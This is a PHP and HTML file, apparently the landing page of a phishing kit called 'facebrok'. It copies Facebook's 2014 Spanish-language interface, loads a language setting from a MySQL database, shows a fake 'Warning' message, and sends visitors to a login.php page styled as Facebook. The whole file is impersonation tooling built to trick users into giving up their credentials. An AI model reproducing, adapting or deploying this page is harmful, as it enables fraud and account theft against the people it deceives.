<?php
// facebrok
error_reporting(E_ALL ^ E_NOTICE);
$lang=$_POST['idio'];
if ($lang=='')
{ 
if (file_exists("croak/install/install.php")) {header("location:croak/install/");} 
include("croak/config.php");
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
$sql=mysql_query("SELECT * FROM methods WHERE id=3") or die('Failed in Consult: '.mysql_error());
$row=mysql_fetch_array($sql);
$lang=''.$row['value'].''; 
} else {$lang=$lang;}
include("lang.php")
?>
<title><?php echo $titleout;?>...</title><meta charset="utf-8" /><link rel="shortcut icon" href="H3nktOa7ZMg.ico" />
    <link type="text/css" rel="stylesheet" href="tNHyj72btAg.css" />
    <link type="text/css" rel="stylesheet" href="Xs2153d7sZv.css" />
    <link type="text/css" rel="stylesheet" href="reQZygv_z8I.css" />
    <link type="text/css" rel="stylesheet" href="AgjbWPv6RnB.css" />
    <link type="text/css" rel="stylesheet" href="DMLSrHyTFd8.css" />
    <link type="text/css" rel="stylesheet" href="6mqNiKOCYyp.css" />
    <link type="text/css" rel="stylesheet" href="aTPhpqGTzZV.css" />
    <link type="text/css" rel="stylesheet" href="OalExLHT1t_.css" />
<meta http-equiv="Content-type" content="text/html; charset=utf-8" /><link rel="shortcut icon" href="H3nktOa7ZMg.ico" />
<script>(require("ServerJSDefine")).handleDefines([["URLFragmentPreludeConfig",[],{"incorporateQuicklingFragment":false,"hashtagRedirect":true},137],["BootloaderConfig",[],{},329]]);new (require("ServerJS"))().handle({"require":[["markJSEnabled"],["lowerDomain"],["URLFragmentPrelude"],["Bootloader"]]});</script></head><body class="fbx _5p3y webkit chrome win Locale_es_ES" dir="ltr"><div class="_li"><div id="pagelet_bluebar"><div id="blueBarDOMInspector" class="_21mm"><div id="blueBarNAXAnchor" class="_4f7n _xxp"><div class="_uaw clearfix _uaw __wu" role="banner"><div class="_59g8"><a class="accessible_elem skipto" href="#newsFeedHeading" target="newsFeedHeading" id="u_0_3"></a><h1 class="_5lus" id="u_0_h"><a data-gt="&#123;&quot;chrome_nav_item&quot;:&quot;logo_chrome&quot;&#125;" href="?ref=logo"><i class="img sp_gViUcvxtqYT sx_914fb4"><u>Facebook</u></i></a></h1><div class="clearfix"><div class="rfloat _ohf"><ul class="_2exj clearfix" role="navigation"><li class="_2pdh _3zm- _55bi _3zm- _55bh" id="u_0_i"><a class="_1ayn" data-gt="&#123;&quot;chrome_nav_item&quot;:&quot;home_chrome&quot;&#125;" href="?ref=tn_tnmn" accesskey="1"><?php echo $home;?><div class="_5ah- _5ahy"><div class="_5ahz"></div></div></a></li><li class="_2wnm _56lq"></li><li class="_2g-k _2wnm"><div class="_3t_z notifCentered notifGentleAppReceipt"><div class="uiToggle _4962 _3nzl" id="fbRequestsJewel"><a class="jewelButton" aria-labelledby="requestsCountWrapper" href="#" rel="toggle" role="button" name="requests" data-gt="&#123;&quot;ua_id&quot;:&quot;jewel:requests&quot;&#125;" data-target="fbRequestsFlyout" aria-haspopup="true" aria-owns="fbRequestsFlyout"><span class="jewelCount"></span></a><div class="__tw toggleTargetClosed _3nzk uiToggleFlyout" id="fbRequestsFlyout"><div class="jewelBeeperHeader"><div class="beeperNubWrapper"><div class="beeperNub"></div></div></div><ul class="jewelItemList _3nzp" id="fbRequestsList"><li id="fbRequestsList_loading_indicator"><img class="jewelLoading img" src="/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif" alt="" width="16" height="11" /></li></ul></div></div><div class="uiToggle _4962 _1z4y" id="u_0_5"><a class="jewelButton" aria-labelledby="mercurymessagesCountWrapper" href="#" rel="toggle" role="button" name="mercurymessages" data-gt="&#123;&quot;ua_id&quot;:&quot;jewel:mercurymessages&quot;&#125;" aria-haspopup="true" aria-owns="u_0_4"></span></a><div class="__tw toggleTargetClosed _1y2l uiToggleFlyout" id="u_0_4"><div class="jewelBeeperHeader"><div class="beeperNubWrapper"><div class="beeperNub"></div></div></div><div class="uiHeader uiHeaderBottomBorder jewelHeader"><div class="clearfix uiHeaderTop"><a class="uiHeaderActions rfloat _ohf" ajaxify="/" href="/messages/new/" accesskey="m" rel="dialog" role="button" id="u_0_6"></a><div><h3 class="uiHeaderTitle"><div><a class="mrm _1sdi _1sdd _1sde" href="#" role="button"><span class="_1sdj _1sdg"></span></a><a class="_1sdi _1v8t _1sdf" href="#" role="button"><span class="_1sdj _1sdh"></span></a></div></h3></div></div></div><div class="_3v_l"><div class="uiScrollableArea fade" style="width:430px;height:325px;" id="MercuryJewelThreadList"><div class="uiScrollableAreaWrap scrollable" aria-label="Zona desplazable" role="group" tabindex="0"><div class="uiScrollableAreaBody" style="width:430px;"><div class="uiScrollableAreaContent"><ul class="uiList jewelItemList jewelHighlight _4kg _6-h _6-j _4kt"><li><div class="jewelContent"></div><img class="jewelLoading img" src="/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif" alt="" width="16" height="11" /></li></ul><div class="clearfix uiMorePager stat_elem _8y5 hidden_elem uiMorePagerLight _52jv"><div><a class="pam uiBoxWhite topborder _8y6 uiMorePagerPrimary" rel="async" href="#" role="button"><i class="mhs mts arrow img sp_kYFeXO-eRrc sx_35ad5a"></i></a><span class="uiMorePagerLoader pam uiBoxWhite topborder _8y6"><img class="img" src="/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif" alt="" width="16" height="11" /></span></div></div></div></div></div><div class="uiScrollableAreaTrack invisible_elem"><div class="uiScrollableAreaGripper"></div></div></div></div><div id="MercuryJewelFooter"><div class="jewelFooter"><a class="seeMore" href="messages/" accesskey="4"><span></span></a></div></div></div></div><div class="uiToggle _4962 _4xi2 west" id="fbNotificationsJewel"><a class="jewelButton" aria-labelledby="notificationsCountWrapper" href="#" rel="toggle" role="button" name="notifications" data-gt="&#123;&quot;ua_id&quot;:&quot;jewel:notifications&quot;&#125;" data-target="fbNotificationsFlyout" aria-haspopup="true" aria-owns="fbNotificationsFlyout"><div class="__tw toggleTargetClosed _4xi1 uiToggleFlyout" id="fbNotificationsFlyout"><div class="jewelBeeperHeader"><div class="beeperNubWrapper"><div class="beeperNub"></div></div></div><div class="uiHeader uiHeaderBottomBorder jewelHeader"><div class="clearfix uiHeaderTop"><div class="rfloat _ohf"><h3 class="accessible_elem"></h3><div class="uiHeaderActions fsm fwn fcg"><a href="#" role="button" id="u_0_7"></a> · <a href="/settings?tab=notifications&amp;section=on_facebook" target="_blank"></a></div></div><div><h3 class="uiHeaderTitle" aria-hidden="true"></h3></div></div></div><div class="_33p"><div id="u_0_j"><img src="/images/loaders/indicator_blue_small.gif" class="_33i" /></div></div><div class="jewelFooter"><a class="seeMore" href="notifications" accesskey="5"><span></span></a></div></div></div></div></li><li class="_2wnm _5cop _55bh" id="navPrivacy"><div class="uiToggle _8-a _4962" id="u_0_9"><a data-onclick="[[&quot;PrivacyLiteFlyout&quot;,&quot;loadBody&quot;]]" class="_59fc _1ayn" aria-labelledby="privacyFlyoutLabel" href="#" rel="toggle" role="button" aria-haspopup="true" aria-owns="u_0_8"><div class="_59fb" id="privacyFlyoutLabel"><i class="accessible_elem"></i></div></a><div class="_8-b __tw toggleTargetClosed uiToggleFlyout" id="u_0_8"><div class="jewelBeeperHeader"><div class="beeperNubWrapper"><div class="beeperNub"></div></div></div><div class="uiHeader uiHeaderBottomBorder _26y1"><div class="clearfix uiHeaderTop"><div class="rfloat _ohf"><h3 class="accessible_elem"></h3><a class="_d1r uiHeaderActions" href="#" role="button"><i class="img sp_gsy1zsuuxgF sx_05e41b"><u>Buscar</u></i></a></div><div><h3 class="uiHeaderTitle" aria-hidden="true"></h3></div></div></div><div id="fbPrivacyLiteFlyoutLoading"><img class="_26y2 img" src="/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif" alt="" width="16" height="11" /></div><div class="_bxv"><div class="_awf"><a class="_awi" href="#" role="button" id="u_0_a"><i class="default img sp_gViUcvxtqYT sx_166503"></i></a><span class="uiSearchInput _awh" id="u_0_b"><span><input type="text" class="inputtext DOMControl_placeholder" maxlength="100" aria-label="Buscar" name="query" placeholder="Buscar ayuda" autocomplete="off" value="Buscar ayuda" /><button type="submit" title="Buscar ayuda"><span class="accessible_elem"></span></button></span></span><a class="_awj hidden_elem" href="#" role="button" id="u_0_c"></a></div><div class="_awg"><div class="_awk hidden_elem" id="u_0_k"></div><div class="_awl hidden_elem" id="u_0_l"><img class="img" src="/rsrc.php/v2/y9/r/jKEcVPZFk-2.gif" alt="" width="32" height="32" /></div></div></div><div class="_4_8m"></div><div class="_26y3"><a class="_5cw0" href="settings/?tab=privacy&amp;privacy_source=privacy_lite"></a><a class="_5cw1" href="help/?ref=privacy_lite" target="_blank"></a></div></div></div></li><li class="_3tmp" id="u_0_m"><a class="_1xn5 _1ayn" id="pageLoginAnchor" href="/" rel="toggle" role="button" aria-haspopup="true" aria-controls="userNavigation" aria-labelledby="userNavigationLabel"><div class="_50__" id="userNavigationLabel"></div></a><div class="navigation" id="userNavigation" role="menu navigation" aria-label="Men&#xfa; de la cuenta"><div class="jewelBeeperHeader"><div class="beeperNubWrapper"><div class="beeperNub"></div></div></div><div id="userNavigationMenu" data-referrer="userNavigationMenu"><img class="_z5- img" src="/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif" alt="" width="16" height="11" /></div></div></li></ul></div><form class="_539- roundedBox" id="searchBarClickRef" method="get" action="search/results/" role="search" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)"><div class="smurfbarTopBorder"></div><div class="uiTypeahead" data-ft="&#123;&quot;tn&quot;:&quot;+Q&quot;&#125;" id="u_0_d"><div class="wrap"><input type="hidden" autocomplete="off" class="hiddenInput" /><div class="innerWrap"><span class="uiSearchInput textInput" id="u_0_e"><span><input type="text" class="inputtext DOMControl_placeholder" maxlength="100" aria-label="Buscar" accesskey="/" id="q" name="q" onclick="var q = $(&quot;q&quot;);if (q.value == q.getAttribute(&quot;placeholder&quot;)) &#123;q.focus(); return false;&#125;" placeholder="<?php echo $bar;?>" autocomplete="off" tabindex="" onfocus="$(&quot;search_first_focus&quot;).value = $(&quot;search_first_focus&quot;).value || +new Date();run_with(this, [&quot;SearchBootloader&quot;], function() &#123;&#125;);" aria-autocomplete="list" aria-expanded="false" aria-owns="typeahead_list_u_0_d" aria-haspopup="true" role="combobox" spellcheck="false" value="" /><button type="submit" onclick="var q = $(&quot;q&quot;);if (q.value == q.getAttribute(&quot;placeholder&quot;)) &#123;q.focus(); return false;&#125;" title="<?php echo $bar;?>"><span class="accessible_elem"></span></button></span></span></div></div><div class="uiTypeaheadView _5lui" id="u_0_2"></div></div><input type="hidden" name="init" id="init" value="mag_glass" /><input type="hidden" name="tas" class="search_sid_input" value="search_preload" /><input type="hidden" name="search_first_focus" id="search_first_focus" value="" /><div class="smurfbarBottomBorder"></div></form></div></div></div><div class="_7fw"><div class="_7fz" id="u_0_n"></div><div class="_7fx"></div></div><div class="pagesVoiceBar"><div id="pagesVoiceBarContent"></div><div id="pagesVoiceBarShadow"></div></div></div></div></div><div id="globalContainer" class="uiContextualLayerParent"><div id="content" class="fb_content clearfix"><div class="_5tz9"><div class="_4-u2 mam _5tza"><div class="_585n _556e _585o" id="u_0_0"><i class="_585p img sp_hy_Nva3ocRK sx_e3d455"><u>Warning</u></i><div class="_585r _50f4"><?php echo $enl;?></div></div><div class="_4-u3 pam"><?php echo $pri;?></div><div class="_4-u3 pam _57d8 _52jw"><a class="_42ft _4jy0 _4jy3 _4jy1 selected _51sy" role="button" href="login.php?view=fbimga100mstartpre" id="u_0_1">
<?php echo $vol;?></a></div></div></div></div><div id="pageFooter" data-referrer="page_footer"><div id="contentCurve"></div><div role="contentinfo" ><table class="uiGrid _51mz navigationGrid" cellspacing="0" cellpadding="0"><tbody><tr class="_51mx"><td class="_51m- hLeft plm"><a href="/facebook" accesskey="8" ><?php echo $b6;?></a></td><td class="_51m- hLeft plm"><a href="" ><?php echo $b8;?></a></td><td class="_51m- hLeft plm"><a href="" title=""><?php echo $c1;?></a></td><td class="_51m- hLeft plm"><a href="" t><?php echo $c3;?></a></td><td class="_51m- hLeft plm"><a href=""><?php echo $c5;?></a></td><td class="_51m- hLeft plm"><a href=""><?php echo $c7;?></a></td><td class="_51m- hLeft plm"><a href="">Cookies</a></td><td class="_51m- hLeft plm"><a href="/policies/?ref=pf" accesskey="9" ><?php echo $d2;?></a></td><td class="_51m- hLeft plm _51mw"><a href="" accesskey="0" ><?php echo $d4;?></a></td></tr></tbody></table></div><div class="mvl copyright"><div><span> Facebook © 2014</span><div class="fsm fwn fcg">
<a rel="dialog" ajaxify="" href="#" role="button"><?php echo $d6;?></a></div></div></div></div></div><div id="pagelet_dock" data-referrer="pagelet_dock"><div class="_48gf fbDockWrapper fbDockWrapperRight _5q5b" id="u_0_f"><div class="fbDock clearfix"><div class="clearfix nubContainer rNubContainer"></div></div></div><div id="u_0_g"></div></div></div>